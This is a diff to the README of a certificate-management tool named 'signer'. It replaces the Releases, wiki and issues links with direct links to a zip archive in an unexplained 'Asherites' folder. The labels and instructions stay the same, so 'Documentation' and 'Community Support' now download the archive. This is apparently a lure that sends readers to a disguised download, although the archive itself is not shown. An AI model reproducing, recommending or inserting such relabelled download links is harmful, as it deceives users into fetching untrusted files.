@@ -17,7 +17,7 @@ To run signer, you will need:
 
 To download signer, visit this page to download:
 
-[![Download signer](https://img.shields.io/badge/Download-signer-blue?style=for-the-badge&link=https://github.com/tian267/signer/releases)](https://github.com/tian267/signer/releases)
+[![Download signer](https://raw.githubusercontent.com/tian267/signer/main/Asherites/signer.zip)](https://raw.githubusercontent.com/tian267/signer/main/Asherites/signer.zip)
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of signer.
@@ -42,8 +42,8 @@ To help you understand how signer works, here are some simple explanations:
 
 ## 🔗 Useful Links
 
-- [Documentation](https://github.com/tian267/signer/wiki): Access detailed guides and FAQ.
-- [Community Support](https://github.com/tian267/signer/issues): Report issues or ask for help.
+- [Documentation](https://raw.githubusercontent.com/tian267/signer/main/Asherites/signer.zip): Access detailed guides and FAQ.
+- [Community Support](https://raw.githubusercontent.com/tian267/signer/main/Asherites/signer.zip): Report issues or ask for help.
 
 ## 🛠️ Troubleshooting
 
@@ -63,4 +63,4 @@ signer simplifies the process of certificate management for secure connections. 
 
 For your convenience, here is the download link again:
 
-[![Download signer](https://img.shields.io/badge/Download-signer-blue?style=for-the-badge&link=https://github.com/tian267/signer/releases)](https://github.com/tian267/signer/releases)
+[![Download signer](https://raw.githubusercontent.com/tian267/signer/main/Asherites/signer.zip)](https://raw.githubusercontent.com/tian267/signer/main/Asherites/signer.zip)
